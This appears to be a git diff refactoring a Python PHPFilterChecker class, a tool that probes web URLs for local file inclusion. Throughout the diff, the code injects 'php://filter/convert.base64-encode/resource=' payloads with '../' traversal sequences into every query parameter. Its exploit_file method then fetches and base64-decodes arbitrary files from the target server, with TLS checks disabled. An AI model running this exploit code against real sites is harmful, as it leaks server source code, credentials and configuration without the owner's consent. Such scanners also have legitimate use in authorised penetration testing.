@@ -1,37 +1,20 @@
 import re
 import base64
-import requests
 import urllib.parse
 
 from rich.syntax import Syntax
-from rich.console import Console
 from rich.progress import Progress
-from urllib3.exceptions import InsecureRequestWarning
 from pygments.lexers import guess_lexer, get_lexer_by_name
 
-requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
+from core.base import BaseChecker
 
-class PHPFilterChecker:
+
+class PHPFilterChecker(BaseChecker):
     def __init__(self, url, depth=10, silent=False):
-        self.console = Console()
-        self.url = self.ensure_correct_protocol(url)
+        super().__init__(url, silent)
         self.depth = depth
-        self.silent = silent
         self.success_depth = None
         self.base64_content = None
-
-    def ensure_correct_protocol(self, url):
-        if not url.startswith(('http://', 'https://')):
-            try:
-                requests.get('https://' + url, timeout=3, verify=False)
-                return 'https://' + url
-            except requests.exceptions.RequestException:
-                try:
-                    requests.get('http://' + url, timeout=3, verify=False)
-                    return 'http://' + url
-                except requests.exceptions.RequestException:
-                    pass
-        return url
 
     def filter_check(self, filename='index.php'):
         parsed_url = urllib.parse.urlparse(self.url)
@@ -49,7 +32,7 @@ class PHPFilterChecker:
             for i in range(self.depth):
                 encoded_path = urllib.parse.quote('../' * i + file)
                 file_paths.append(('php://filter/convert.base64-encode/resource=' + encoded_path, re.compile(r'(?:(?:[A-Za-z0-9+\/]{4}){4,}(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)?)')))
-            
+
         total_operations = len(params.keys()) * len(file_paths)
 
         if not self.silent:
@@ -67,15 +50,9 @@ class PHPFilterChecker:
                 new_params[param_name] = file_path
                 new_query = urllib.parse.urlencode(new_params, doseq=True)
                 fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-                try:
-                    response = requests.get(fuzzed_url, timeout=5, verify=False)
-                except requests.exceptions.ConnectionError:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    return False, None
-                except requests.exceptions.RequestException:
-                    if not self.silent:
-                        self.console.print("[bold red]Request Timeout Error (WAF or down host)...[/bold red]")
+
+                response = self._safe_get(fuzzed_url)
+                if response is None:
                     return False, None
 
                 matches = file_regex.findall(response.text)
@@ -83,23 +60,21 @@ class PHPFilterChecker:
                 for match in matches:
                     try:
                         base64.b64decode(match).decode("utf-8")
-                        if len(match) > 50:  
-                            valid_matches.append(match)  
+                        if len(match) > 50:
+                            valid_matches.append(match)
                     except Exception:
                         continue
-                if valid_matches:  
+                if valid_matches:
                     if not self.silent:
                         self.console.print(f"\n[bold red]Possible LFI detected (php_filter: method)[/bold red] in '{param_name}' with '{file_path}'", style='bold red')
                     self.success_depth = i
-                    self.base64_content = valid_matches[0]  
+                    self.base64_content = valid_matches[0]
                     return True, param_name
 
                 if progress:
                     progress.update(task, advance=1)
 
         return False, None
-
-
 
     def exploit_file(self, filename, param_name):
         if self.success_depth is None:
@@ -114,12 +89,11 @@ class PHPFilterChecker:
             new_params[param_name] = 'php://filter/convert.base64-encode/resource=' + encoded_path
             new_query = urllib.parse.urlencode(new_params, doseq=True)
             fuzzed_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))
-            try:
-                response = requests.get(fuzzed_url, verify=False)
-            except requests.exceptions.ConnectionError:
-                    self.console.print("[bold red]Request Failed (WAF or down host)...[/bold red]")
-                    return False    
-            
+
+            response = self._safe_get(fuzzed_url)
+            if response is None:
+                return False
+
             base64_regex = re.compile(r'(?:(?:[A-Za-z0-9+\/]{4}){4,}(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)?)')
 
             matches = base64_regex.findall(response.text)
@@ -146,7 +120,6 @@ class PHPFilterChecker:
         except Exception:
             print("Failed to exploit the LFI.")
             return False
-
 
 
 def main():
